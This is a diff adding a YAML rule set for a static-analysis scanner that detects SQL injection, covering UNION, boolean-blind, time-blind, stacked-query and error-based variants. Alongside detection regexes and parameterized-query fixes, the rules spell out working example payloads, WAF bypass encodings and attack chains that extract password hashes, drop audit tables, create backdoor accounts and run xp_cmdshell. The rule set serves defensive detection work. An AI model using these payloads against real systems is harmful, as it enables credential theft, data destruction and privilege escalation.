@@ -1,0 +1,1725 @@
+rules:
+- rule_id: SQL-INJ-001
+  title: UNION-Based SQL Injection
+  description: 'Detects UNION SELECT injection patterns used for data exfiltration by appending additional result sets to
+    legitimate queries. Covers NULL-padding column enumeration, information_schema reconnaissance, targeted extraction of
+    credential stores and PII, GROUP_CONCAT aggregation, and database-specific system catalog queries across MySQL, PostgreSQL,
+    SQL Server, and Oracle.
+
+    '
+  language: sql
+  category: injection
+  severity: Critical
+  confidence: 0.94
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - union-injection
+  - data-exfiltration
+  - schema-enumeration
+  - column-enumeration
+  - information-disclosure
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?i)UNION\s+(?:ALL\s+)?SELECT\s+(?:NULL|[0-9]+|'[^']*'|0x[0-9a-fA-F]+)(?:\s*,\s*(?:NULL|[0-9]+|'[^']*'|0x[0-9a-fA-F]+))*
+  - type: regex
+    pattern: (?i)UNION\s+SELECT\s+(?:table_name|column_name|schema_name|table_schema)
+  - type: regex
+    pattern: (?i)UNION\s+SELECT\s+.*information_schema
+  - type: regex
+    pattern: (?i)UNION\s+SELECT\s+.*(?:password|passwd|pwd|credit_card|ssn|token)
+  - type: regex
+    pattern: (?i)UNION\s+SELECT\s+GROUP_CONCAT\s*\(
+  - type: regex
+    pattern: (?i)UNION\s+SELECT\s+.*(?:pg_catalog|pg_shadow|pg_authid|pg_roles)
+  - type: regex
+    pattern: (?i)UNION\s+SELECT\s+.*(?:sys\.objects|sys\.columns|sysobjects|syscolumns)
+  - type: regex
+    pattern: (?i)ORDER\s+BY\s+[0-9]{2,}\s*(?:--|#|\/\*)
+  anti_patterns:
+  - CREATE VIEW
+  - -- legitimate union
+  - CREATE\s+(?:OR\s+REPLACE\s+)?PROCEDURE.*UNION
+  - CREATE\s+(?:OR\s+REPLACE\s+)?VIEW.*UNION
+  - BEGIN\s+.*UNION.*END\s*;
+  - \.union\s*\(\s*QueryBuilder
+  - QuerySet\.union\(
+  - Arel::Nodes::Union
+  - \.unionAll\s*\(
+  - LINQ.*\.Union\(
+  - PreparedStatement.*UNION
+  - parameterized.*UNION
+  - \?\s*UNION\s*\?
+  - PREPARE.*UNION.*USING
+  - -- migration
+  bypass_variants:
+  - pattern: (?i)UN(?:ION|%49ON|%69on)\s+(?:SE|%53E|%73e)LECT
+    description: URL-encoded keyword fragments to evade basic UNION SELECT keyword filters
+  - pattern: (?i)\/\*\*\/UNION\/\*\*\/SELECT
+    description: Comment insertion between keywords to bypass WAF tokenization
+  - pattern: (?i)UNION\s+ALL\s+SELECT\s+CHAR\(\d+(?:,\d+)*\)
+    description: CHAR() function to produce string output without literal quotes
+  evasion_indicators:
+  - case alternation
+  - comment insertion between keywords
+  - URL encoding of UNION or SELECT
+  - CHAR() instead of string literals
+  - hex encoding of string values
+  - double URL encoding
+  encoding_variants:
+  - '%55NION %53ELECT'
+  - UNI%4FN SEL%45CT
+  - '0x554e494f4e'
+  multi_function_chain_patterns:
+  - ORDER BY -> UNION SELECT  (column count enumeration then extraction)
+  - UNION SELECT information_schema.tables -> UNION SELECT information_schema.columns (schema recon chain)
+  - UNION SELECT LOAD_FILE -> INTO OUTFILE (file read then webshell write)
+  privilege_context_flags:
+  - FILE privilege required for LOAD_FILE/INTO OUTFILE
+  - SELECT privilege on information_schema or system catalogs
+  - DBA role for Oracle ALL_TABLES/DBA_USERS queries
+  business_logic_indicator:
+  - Product search or listing with user-filtered categories
+  - Report generation with user-supplied parameters
+  - Data export endpoint accepting column/table parameters
+  probable_taint_paths:
+  - source: request.query.id
+    through: string concatenation or template literal
+    sink: db.query() or cursor.execute()
+  - source: request.params.category
+    through: f-string or format() interpolation
+    sink: connection.execute()
+  - source: URL search parameter
+    through: sprintf or String.Format
+    sink: Statement.executeQuery()
+  context_awareness:
+    surrounding_context_patterns:
+    - SELECT\s+.*FROM\s+\w+\s+WHERE\s+.*=\s*['"]?\{\{.*\}\}['"]?
+    - SELECT\s+.*FROM\s+(?:products|items|articles|posts)\s+WHERE
+    - \?id=|\?page=|\?category=|\?search=
+    - ORDER\s+BY\s+\d+.*UNION
+    taint_source_indicators:
+    - request\.(?:params|query|body|headers)\[
+    - \$_(?:GET|POST|REQUEST)\[
+    - HttpServletRequest\.getParameter\(
+    - req\.query\.
+    - flask\.request\.args\.get\(
+    - context\.params\[
+    taint_sink_indicators:
+    - cursor\.execute\(
+    - connection\.query\(
+    - Statement\.executeQuery\(
+    - sequelize\.query\(
+    - knex\.raw\(
+    - connection\.execute\(
+    sanitization_patterns:
+    - parseInt\(
+    - intval\(
+    - Integer\.parseInt\(
+    - is_numeric\(
+    - \binput.*whitelist
+    - escape_string\(
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * data_sensitivity_multiplier
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker discovers a product search page at /products?category=electronics that constructs the query:
+      SELECT name, price, description FROM products WHERE category = ''<input>''. The attacker determines column count via
+      ORDER BY enumeration, then submits: /products?category='' UNION SELECT username, password, email FROM users-- extracting
+      all user credentials rendered in the product listing template.
+
+      '
+    example_payload: ''' UNION SELECT username, password, email FROM users--'
+    attacker_objective: Exfiltrate sensitive data from arbitrary database tables by injecting a secondary SELECT that merges
+      its results into the application response rendering.
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'UNION-based injection allows extracting data from any table in the database
+
+    by appending additional SELECT statements to the original query. This can
+
+    expose credentials, personal data, financial records, and proprietary data.
+
+    Combined with file read/write functions, it may enable server-side file access
+
+    or remote code execution via webshell upload.
+
+    '
+  remediation: "Parameterized Query Examples:\n\n  PostgreSQL (Node.js pg):\n    const result = await pool.query('SELECT name,\
+    \ price FROM products WHERE category = $1', [categoryInput]);\n\n  MySQL (PHP PDO):\n    $stmt = $pdo->prepare('SELECT\
+    \ name, price FROM products WHERE category = :category');\n    $stmt->execute(['category' => $categoryInput]);\n\n  SQL\
+    \ Server (Python pyodbc):\n    cursor.execute(\"SELECT name, price FROM products WHERE category = ?\", categoryInput)\n\
+    \nWAF Rules:\n  - Block requests containing UNION followed by SELECT keyword\n  - Block requests referencing information_schema,\
+    \ sys.objects, pg_catalog\n  - ModSecurity: SecRule ARGS \"@rx (?i)(union).{1,40}(select)\" \"id:1002,deny,status:403\"\
+    \n\nDatabase Permission Hardening:\n  - Revoke SELECT on information_schema for application accounts\n  - Revoke FILE\
+    \ privilege on MySQL to prevent LOAD_FILE and INTO OUTFILE\n  - Create application-specific database views exposing only\
+    \ required columns\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://owasp.org/www-community/attacks/SQL_Injection
+  - https://portswigger.net/web-security/sql-injection/union-attacks
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SQL-INJ-002
+    - SQL-INJ-005
+    - SQL-INJ-009
+- rule_id: SQL-INJ-002
+  title: Boolean-Based Blind SQL Injection
+  description: 'Detects boolean-based blind SQL injection patterns that infer data from observable differences in application
+    response behavior. Attackers construct conditional expressions using AND/OR with IF, CASE WHEN, SUBSTRING, ASCII, and
+    comparison operators to extract data one bit or character at a time based on whether the application returns a valid or
+    error response.
+
+    '
+  language: sql
+  category: injection
+  severity: High
+  confidence: 0.9
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - blind-sqli
+  - boolean-based
+  - data-inference
+  - side-channel
+  - conditional-response
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+\d+\s*=\s*IF\s*\(
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+SUBSTRING\s*\(
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+ASCII\s*\(\s*SUBSTR
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+\(SELECT\s+(?:CASE|IF)\s+.*(?:THEN|,)\s*1\s*(?:ELSE|,)\s*0\s*(?:END)?\s*\)\s*=\s*1
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+(?:SELECT\s+)?COUNT\s*\(\s*\*\s*\)\s+FROM\s+\w+\s*(?:>|<|=)\s*\d+
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+ORD\s*\(\s*MID\s*\(
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+\(SELECT\s+TOP\s+1\s+.*FROM\s+\w+\s+WHERE\s+.*(?:NOT\s+IN|>)\s*\(SELECT
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+LENGTH\s*\(\s*\(SELECT\s+
+  anti_patterns:
+  - -- test data
+  - -- performance test
+  - CREATE\s+(?:OR\s+REPLACE\s+)?PROCEDURE
+  - CREATE\s+(?:OR\s+REPLACE\s+)?FUNCTION
+  - \.where\s*\(.*\)\s*\.andWhere\s*\(
+  - Criteria\.add\(
+  - HQL\s*\|\s*JPQL
+  - PreparedStatement
+  - parameterized
+  - cursor\.execute\(.*,\s*\(
+  - connection\.query\(.*,\s*\[
+  - ASCII\s*\(\s*SUBSTR.*-- data validation
+  - -- unit test
+  - -- migration
+  - legitimate conditional
+  bypass_variants:
+  - pattern: (?i)(?:AND|OR)\s+CONV\s*\(\s*HEX\s*\(\s*SUBSTR
+    description: HEX/CONV encoding to extract data as numeric values avoiding string comparison filters
+  - pattern: (?i)(?:AND|OR)\s+\(SELECT\s+CASE\s+WHEN.*THEN\s+'a'\s+ELSE\s+'b'\s+END\)\s*=\s*'a'
+    description: CASE WHEN with string comparison to infer boolean condition
+  - pattern: (?i)(?:AND|OR)\s+(?:NOT\s+)?EXISTS\s*\(\s*SELECT
+    description: EXISTS/NOT EXISTS subquery to infer data presence without direct comparison
+  evasion_indicators:
+  - alternating case for keywords
+  - comment injection between AND/OR and condition
+  - nested parentheses to confuse parser
+  - using mathematical expressions instead of direct comparison
+  - hex-encoded string comparisons
+  - binary search pattern in sequential requests
+  encoding_variants:
+  - '%41ND %53UBSTRING'
+  - '0x414e44'
+  - CHAR(65,78,68) for AND
+  multi_function_chain_patterns:
+  - LENGTH() -> SUBSTRING() -> ASCII() (determine length then extract char by char)
+  - COUNT(*) FROM table -> SUBSTRING((SELECT col FROM table LIMIT 1),pos,1) (enumerate then extract)
+  - AND 1=1 vs AND 1=2 (confirm injection) -> SUBSTRING extraction (exfiltrate)
+  privilege_context_flags:
+  - SELECT privilege on target tables
+  - Subquery execution privilege
+  - No special privileges needed for basic boolean inference
+  business_logic_indicator:
+  - Search endpoint returning different content based on results
+  - Profile page displaying or hiding elements based on query result
+  - API endpoint returning 200 vs 404 based on data existence
+  probable_taint_paths:
+  - source: request.query.id
+    through: string concatenation in WHERE clause
+    sink: cursor.execute()
+  - source: request.params.slug
+    through: template literal interpolation
+    sink: db.query()
+  - source: URL path parameter
+    through: format string in SQL builder
+    sink: Statement.executeQuery()
+  context_awareness:
+    surrounding_context_patterns:
+    - WHERE\s+\w+\s*=\s*['"]?\{\{.*\}\}['"]?\s+AND\s+
+    - AND\s+1\s*=\s*(?:CASE|IF)
+    - response\.(?:status|length|time|body)\s*(?:==|!=|>|<)
+    - SELECT\s+.*FROM\s+\w+\s+WHERE\s+\w+\s*=
+    taint_source_indicators:
+    - request\.(?:params|query|body|headers)\[
+    - \$_(?:GET|POST|REQUEST)\[
+    - HttpServletRequest\.getParameter\(
+    - req\.(?:body|query|params)
+    - params\.get\(
+    - URL\.searchParams\.get\(
+    taint_sink_indicators:
+    - cursor\.execute\(
+    - connection\.query\(
+    - Statement\.executeQuery\(
+    - db\.rawQuery\(
+    - sequelize\.query\(
+    - knex\.raw\(
+    sanitization_patterns:
+    - parseInt\(
+    - intval\(
+    - is_numeric\(
+    - whitelist_validate\(
+    - escape_string\(
+    - prepared_statement
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (boolean_channel_available + automation_factor) / 2
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'An attacker targets a product page at /product?id=42 where the application shows a product or a 404 page.
+      The attacker confirms injection with /product?id=42 AND 1=1 (product shown) vs /product?id=42 AND 1=2 (404). They then
+      extract the admin password hash character by character using AND ASCII(SUBSTRING((SELECT password FROM users WHERE username=''admin''),1,1))>77,
+      binary-searching the ASCII range for each position.
+
+      '
+    example_payload: 42 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>77--
+    attacker_objective: Extract sensitive data character-by-character through observable differences in application response,
+      bypassing all output filtering.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Boolean-based blind injection enables data extraction one character at a time
+
+    through response analysis. Though slower than UNION-based attacks, automated
+
+    tools like sqlmap can extract entire databases. The technique works even when
+
+    error messages and direct output are suppressed.
+
+    '
+  remediation: "Parameterized Query Examples:\n\n  PostgreSQL (Go database/sql):\n    rows, err := db.Query(\"SELECT name,\
+    \ price FROM products WHERE id = $1\", productId)\n\n  MySQL (Java Spring JdbcTemplate):\n    Product product = jdbcTemplate.queryForObject(\n\
+    \        \"SELECT name, price FROM products WHERE id = ?\",\n        new Object[]{productId}, productRowMapper);\n\nWAF\
+    \ Rules:\n  - Block requests containing SUBSTRING, ASCII, ORD, MID combined with AND/OR\n  - Implement response time anomaly\
+    \ detection\n  - ModSecurity: SecRule ARGS \"@rx (?i)(and|or)\\s+(ascii|substring|substr|ord|mid)\\s*\\(\" \"id:1006,deny\"\
+    \n\nDatabase Hardening:\n  - Use parameterized queries exclusively\n  - Implement query execution time limits\n  - Monitor\
+    \ sequential requests with incrementing SUBSTRING position parameters\n"
+  references:
+  - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://portswigger.net/web-security/sql-injection/blind
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: flow-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SQL-INJ-003
+    - SQL-INJ-001
+    - SQL-INJ-005
+- rule_id: SQL-INJ-003
+  title: Time-Based Blind SQL Injection
+  description: 'Detects time-based blind SQL injection patterns that use database-specific delay functions such as SLEEP(),
+    WAITFOR DELAY, pg_sleep(), DBMS_PIPE.RECEIVE_MESSAGE(), and BENCHMARK() to infer data from response timing. Attackers
+    introduce conditional delays to extract data bit by bit based on whether the response is delayed.
+
+    '
+  language: sql
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - blind-sqli
+  - time-based
+  - sleep
+  - waitfor
+  - pg_sleep
+  - benchmark
+  - side-channel
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?i)WAITFOR\s+DELAY\s+['"][0-9]+:[0-9]+:[0-9]+['"]
+  - type: regex
+    pattern: (?i)SLEEP\s*\(\s*[0-9]+
+  - type: regex
+    pattern: (?i)BENCHMARK\s*\(\s*[0-9]+\s*,
+  - type: regex
+    pattern: (?i)pg_sleep\s*\(\s*[0-9]+
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+(?:CASE\s+WHEN)\s+.*THEN\s+(?:SLEEP|WAITFOR|BENCHMARK|pg_sleep)
+  - type: regex
+    pattern: (?i)dbms_pipe\.receive_message\s*\(
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+IF\s*\([^,]+,\s*(?:SLEEP|BENCHMARK)\s*\([0-9]+
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+\(SELECT\s+CASE\s+WHEN.*THEN\s+pg_sleep\s*\([0-9]+\)
+  anti_patterns:
+  - -- performance test
+  - -- benchmark
+  - CREATE\s+(?:OR\s+REPLACE\s+)?PROCEDURE
+  - CREATE\s+(?:OR\s+REPLACE\s+)?FUNCTION
+  - WAITFOR\s+DELAY.*-- scheduled job
+  - pg_sleep.*-- maintenance window
+  - \.where\s*\(.*\)\s*\.andWhere\s*\(
+  - Criteria\.add\(
+  - PreparedStatement
+  - parameterized
+  - cursor\.execute\(.*,\s*\(
+  - connection\.query\(.*,\s*\[
+  - BENCHMARK.*-- load testing
+  - SLEEP.*-- rate limiting
+  - -- migration
+  bypass_variants:
+  - pattern: (?i)(?:AND|OR)\s+(?:CASE\s+WHEN)\s+.*THEN\s+RANDOMBLOB\s*\(\s*[0-9]{6,}
+    description: SQLite heavy computation via RANDOMBLOB instead of SLEEP for time-based inference
+  - pattern: (?i)(?:AND|OR)\s+\(SELECT\s+COUNT\s*\(\*\)\s+FROM\s+generate_series\s*\(\s*1\s*,\s*[0-9]{6,}\s*\)\s*\)
+    description: PostgreSQL generate_series for computation-based delay without pg_sleep
+  - pattern: (?i)WAITFOR\s+DELAY\s+CHAR\s*\(\s*48\s*\)\s*\+\s*CHAR
+    description: CHAR() function to construct WAITFOR DELAY time string dynamically
+  evasion_indicators:
+  - using heavy computation instead of sleep functions
+  - chained subqueries for computational delay
+  - CHAR() construction of delay string
+  - comment insertion within sleep call
+  - conditional delay only when data matches
+  - randomized delay values to evade timing detection
+  encoding_variants:
+  - '%53LEEP(%35)'
+  - '0x534c454550'
+  - CHAR(83,76,69,69,80)
+  multi_function_chain_patterns:
+  - IF(condition, SLEEP(5), 0)  (conditional delay for boolean inference)
+  - CASE WHEN SUBSTRING(...)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END (character extraction)
+  - AND 1=1 (confirm injection) -> SLEEP-based extraction (time-channel exfiltration)
+  privilege_context_flags:
+  - No special privileges needed for SLEEP/pg_sleep
+  - BENCHMARK requires execution privilege on MySQL
+  - DBMS_PIPE requires EXECUTE privilege on Oracle
+  business_logic_indicator:
+  - Any endpoint with server-side database query and measurable response time
+  - Login forms with consistent response times
+  - Search endpoints where timing differences are observable
+  probable_taint_paths:
+  - source: request.query.id
+    through: string concatenation in WHERE clause
+    sink: cursor.execute()
+  - source: request.body.username
+    through: format string interpolation
+    sink: connection.query()
+  - source: request.params.slug
+    through: template literal
+    sink: db.rawQuery()
+  context_awareness:
+    surrounding_context_patterns:
+    - WHERE\s+\w+\s*=\s*['"]?\{\{.*\}\}['"]?\s+AND\s+
+    - AND\s+1\s*=\s*(?:CASE|IF)
+    - response\.(?:status|length|time|body)\s*(?:==|!=|>|<)
+    - time\.(?:sleep|time|perf_counter).*(?:before|after|elapsed)
+    taint_source_indicators:
+    - request\.(?:params|query|body|headers)\[
+    - \$_(?:GET|POST|REQUEST)\[
+    - HttpServletRequest\.getParameter\(
+    - req\.(?:body|query|params)
+    - params\.get\(
+    - URL\.searchParams\.get\(
+    taint_sink_indicators:
+    - cursor\.execute\(
+    - connection\.query\(
+    - Statement\.executeQuery\(
+    - db\.rawQuery\(
+    - sequelize\.query\(
+    - knex\.raw\(
+    sanitization_patterns:
+    - parseInt\(
+    - intval\(
+    - is_numeric\(
+    - whitelist_validate\(
+    - escape_string\(
+    - prepared_statement
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: severity_weight * confidence * (time_channel_reliability + automation_factor) / 2
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'An attacker targets a login form where error messages are generic. They inject: admin'' AND IF(SUBSTRING((SELECT
+      password FROM users LIMIT 1),1,1)=''a'', SLEEP(5),0)--  If the response takes 5 seconds, the first character of the
+      password is ''a''. By iterating through characters and positions, the attacker extracts the full password hash in approximately
+      420 requests for a 60-char bcrypt hash.
+
+      '
+    example_payload: admin' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
+    attacker_objective: Extract data through timing side-channel when all direct output channels are blocked.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Time-based blind injection allows data extraction through timing
+
+    side-channels even when error messages are completely suppressed and responses
+
+    are identical. Though slower than other techniques, it is highly automatable
+
+    with tools like sqlmap and can extract entire databases given sufficient time.
+
+    '
+  remediation: "Parameterized Query Examples:\n\n  MySQL (Node.js mysql2):\n    await connection.execute('SELECT * FROM users\
+    \ WHERE username = ? AND password = ?', [username, passwordHash]);\n\n  PostgreSQL (Python psycopg2):\n    cursor.execute(\"\
+    SELECT * FROM users WHERE username = %s\", (username,))\n\nWAF Rules:\n  - Block SLEEP, WAITFOR, BENCHMARK, pg_sleep function\
+    \ calls in request parameters\n  - Implement response time anomaly detection\n  - ModSecurity: SecRule ARGS \"@rx (?i)(sleep|waitfor|benchmark|pg_sleep)\\\
+    s*\\(\" \"id:1005,deny\"\n\nDatabase Hardening:\n  - Set statement_timeout in PostgreSQL\n  - Set MAX_EXECUTION_TIME in\
+    \ MySQL\n  - Configure connection pool idle timeouts below common SLEEP values\n"
+  references:
+  - https://owasp.org/www-community/attacks/Blind_SQL_Injection
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://portswigger.net/web-security/sql-injection/blind
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: flow-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SQL-INJ-002
+    - SQL-INJ-001
+    - SQL-INJ-005
+- rule_id: SQL-INJ-004
+  title: Stacked Queries SQL Injection
+  description: 'Detects stacked query injection patterns using semicolons to append additional SQL statements. Covers destructive
+    operations (DROP, DELETE, TRUNCATE), privilege escalation via user creation and GRANT, data manipulation through INSERT/UPDATE,
+    and OS command execution through xp_cmdshell and COPY FROM PROGRAM.
+
+    '
+  language: sql
+  category: injection
+  severity: Critical
+  confidence: 0.9
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - stacked-queries
+  - multi-statement
+  - destructive-operations
+  - privilege-escalation
+  - command-execution
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?i);\s*(?:DROP|DELETE|TRUNCATE|ALTER|CREATE|INSERT|UPDATE|EXEC|EXECUTE|xp_)\s+
+  - type: regex
+    pattern: (?i);\s*DROP\s+TABLE\s+
+  - type: regex
+    pattern: (?i);\s*(?:EXEC|EXECUTE)\s+(?:xp_cmdshell|sp_configure|sp_addlogin)
+  - type: regex
+    pattern: (?i);\s*WAITFOR\s+DELAY\s+
+  - type: regex
+    pattern: (?i);\s*SHUTDOWN\s*(?:WITH\s+NOWAIT)?
+  - type: regex
+    pattern: (?i);\s*CREATE\s+(?:USER|LOGIN|ROLE)\s+
+  - type: regex
+    pattern: (?i);\s*GRANT\s+(?:ALL|DBA|ADMIN|SUPER)\s+
+  - type: regex
+    pattern: (?i);\s*(?:COPY|\\copy)\s+.*(?:FROM|TO)\s+(?:PROGRAM|'\|)
+  anti_patterns:
+  - -- migration
+  - BEGIN TRANSACTION
+  - COMMIT
+  - CREATE\s+(?:OR\s+REPLACE\s+)?PROCEDURE
+  - CREATE\s+(?:OR\s+REPLACE\s+)?FUNCTION
+  - CREATE\s+(?:OR\s+REPLACE\s+)?TRIGGER
+  - DELIMITER\s+\$\$
+  - DO\s+\$\$
+  - \.transaction\s*\(\s*(?:async)?\s*(?:trx|t|tx)\s*=>
+  - Session\.begin_nested\(
+  - TransactionScope
+  - ActiveRecord.*transaction\s+do
+  - PreparedStatement
+  - parameterized
+  - -- flyway
+  bypass_variants:
+  - pattern: (?i);\s*DECLARE\s+@\w+.*EXEC\s*\(
+    description: Variable declaration chain to construct and execute dynamic SQL avoiding direct keyword detection
+  - pattern: (?i);\s*SET\s+@\w+\s*=\s*(?:CHAR|CONCAT)\s*\(.*PREPARE\s+\w+\s+FROM\s+@
+    description: CHAR/CONCAT to build SQL string in variable, then PREPARE/EXECUTE to run it
+  - pattern: (?i)%3B\s*(?:DROP|INSERT|UPDATE|DELETE|EXEC)
+    description: URL-encoded semicolon to bypass WAF semicolon detection
+  evasion_indicators:
+  - URL-encoded semicolons
+  - dynamic SQL via DECLARE/SET/EXEC chain
+  - CHAR() function to build SQL keywords
+  - hex-encoded statement separators
+  - newline characters instead of semicolons in some databases
+  - comment-terminated statements
+  encoding_variants:
+  - '%3B DROP TABLE'
+  - '0x3B'
+  - CHAR(59) + 'DROP'
+  multi_function_chain_patterns:
+  - ; DROP TABLE audit_logs; UPDATE users SET role='admin' (destroy evidence then escalate)
+  - ; CREATE USER backdoor; GRANT ALL TO backdoor (create persistent access)
+  - ; EXEC xp_cmdshell 'net user attacker P@ss /add' (OS-level privilege escalation)
+  privilege_context_flags:
+  - DDL privileges required for DROP/ALTER/CREATE
+  - sysadmin role for xp_cmdshell on SQL Server
+  - SUPERUSER for COPY FROM PROGRAM on PostgreSQL
+  - GRANT privilege for privilege escalation
+  business_logic_indicator:
+  - Profile update endpoint with text fields
+  - Comment or review submission forms
+  - Any endpoint that updates database records
+  probable_taint_paths:
+  - source: request.body.bio
+    through: string concatenation in UPDATE statement
+    sink: cursor.execute()
+  - source: request.body.comment
+    through: template interpolation in INSERT
+    sink: connection.query()
+  - source: form field value
+    through: sprintf or String.Format
+    sink: Statement.execute()
+  context_awareness:
+    surrounding_context_patterns:
+    - WHERE\s+.*=\s*['"]?\{\{.*\}\}['"]?\s*;
+    - query.*\+.*request
+    - sql.*concat.*input
+    - string\.Format.*SELECT.*\{0\}
+    taint_source_indicators:
+    - request\.(?:params|query|body|headers)\[
+    - \$_(?:GET|POST|REQUEST)\[
+    - HttpServletRequest\.getParameter\(
+    - req\.(?:body|query|params)\.
+    - sys\.argv\[
+    - Environment\.GetEnvironmentVariable\(
+    taint_sink_indicators:
+    - cursor\.execute\(
+    - connection\.query\(
+    - Statement\.execute\(
+    - mysqli_multi_query\(
+    - PDO::exec\(
+    - knex\.raw\(
+    sanitization_patterns:
+    - strip_semicolons\(
+    - remove_stacked_queries\(
+    - query_single_statement\(
+    - disallow_multi_statement
+    - PDO::ATTR_EMULATE_PREPARES.*false
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * destructive_potential_multiplier
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker submits a profile bio containing: ''; DROP TABLE audit_logs; UPDATE users SET role = ''admin''
+      WHERE username = ''attacker''; -- The database driver supports multi-statement execution, so all three statements run.
+      The audit trail is destroyed and the attacker gains admin privileges.
+
+      '
+    example_payload: '''; DROP TABLE audit_logs; UPDATE users SET role = ''admin'' WHERE username = ''attacker''; --'
+    attacker_objective: Execute arbitrary additional SQL statements for data destruction, privilege escalation, backdoor creation,
+      or OS command execution.
+  confidence_factors:
+    pattern_strength: high
+    context_match: medium
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Stacked query injection enables executing additional SQL statements including
+
+    DROP TABLE, data modification, stored procedure execution, and time-based attacks.
+
+    Impact extends to complete database destruction, privilege escalation, backdoor
+
+    account creation, and OS command execution via xp_cmdshell or COPY FROM PROGRAM.
+
+    '
+  remediation: "Parameterized Query Examples:\n\n  PostgreSQL (Python psycopg2):\n    cursor.execute(\"UPDATE profiles SET\
+    \ bio = %s WHERE user_id = %s\", (bio_input, user_id))\n\n  MySQL (Node.js mysql2):\n    await connection.execute('UPDATE\
+    \ profiles SET bio = ? WHERE user_id = ?', [bioInput, userId]);\n\nWAF Rules:\n  - Block semicolons followed by SQL keywords\
+    \ (DROP, DELETE, INSERT, UPDATE, EXEC)\n  - Block xp_cmdshell, sp_configure, sp_addlogin\n  - ModSecurity: SecRule ARGS\
+    \ \"@rx (?i)(;)\\s*(drop|delete|insert|update|exec)\" \"id:1003,deny\"\n\nDatabase Hardening:\n  - Disable multi-statement\
+    \ execution (PDO::ATTR_EMULATE_PREPARES = false)\n  - Revoke DROP, ALTER, CREATE, GRANT from application accounts\n  -\
+    \ Disable xp_cmdshell on SQL Server\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://owasp.org/www-community/attacks/SQL_Injection
+  - https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SQL-INJ-001
+    - SQL-INJ-006
+    - SQL-INJ-010
+- rule_id: SQL-INJ-005
+  title: Error-Based SQL Injection
+  description: 'Detects error-based SQL injection patterns that leverage database error messages to extract data. Uses EXTRACTVALUE,
+    UPDATEXML, XMLTYPE, EXP, CONVERT, CAST, and other functions that produce verbose error messages containing query results
+    when given malformed input. This technique provides faster data extraction than blind methods.
+
+    '
+  language: sql
+  category: injection
+  severity: Medium
+  confidence: 0.86
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - error-based
+  - extractvalue
+  - updatexml
+  - data-exfiltration
+  - verbose-errors
+  - xmltype
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?i)EXTRACTVALUE\s*\(\s*[0-9]+\s*,\s*CONCAT
+  - type: regex
+    pattern: (?i)UPDATEXML\s*\(.*CONCAT\s*\(
+  - type: regex
+    pattern: (?i)(?:AND|OR)\s+\(SELECT\s+.*FROM\s*\(\s*SELECT\s+COUNT\s*\(\*\)\s*,\s*CONCAT
+  - type: regex
+    pattern: (?i)CONVERT\s*\(\s*(?:int|varchar)\s*,\s*\(SELECT
+  - type: regex
